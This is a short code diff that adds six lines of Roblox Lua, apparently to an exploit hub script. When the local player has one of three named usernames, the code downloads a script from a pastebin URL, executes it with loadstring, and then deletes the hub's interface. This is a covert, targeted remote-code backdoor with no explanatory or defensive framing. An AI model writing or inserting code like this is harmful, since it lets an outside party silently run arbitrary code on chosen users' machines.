@@ -1,0 +1,6 @@
+local Plr = game.Players.LocalPlayer
+
+if Plr.Name == "dokdeij" or Plr.Name == "asdasdasadsasasad" or Plr.Name == "hdheheueuehvr" then
+loadstring(game:HttpGet(('https://pastebin.com/raw/snthZzY9'),true))()
+game.CoreGui.VHubCoreScreen:Destroy()
+end
